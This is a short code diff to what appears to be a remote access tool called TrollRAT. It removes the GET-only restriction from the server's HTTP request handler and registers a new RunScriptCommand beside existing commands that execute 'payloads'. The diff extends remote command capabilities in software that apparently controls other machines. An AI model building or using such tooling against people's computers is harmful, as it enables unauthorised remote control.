@@ -62,8 +62,9 @@ namespace TrollRAT.Server
             {
                 var context = listener.GetContext();
 
-                if (context.Request.HttpMethod == "GET")
-                {
+                // TODO Better GET/POST handling
+                //if (context.Request.HttpMethod == "GET")
+                //{
                     var path = context.Request.Url.AbsolutePath;
                     bool processed = false;
 
@@ -84,7 +85,7 @@ namespace TrollRAT.Server
                     }
 
                     context.Response.Close();
-                }
+                //}
             }
         }
     }
@@ -107,6 +108,8 @@ namespace TrollRAT.Server
 
             commands.Add(new ExecuteCommand(payloads));
             commands.Add(new SetCommand(payloads));
+
+            commands.Add(new RunScriptCommand());
         }
     }
 }
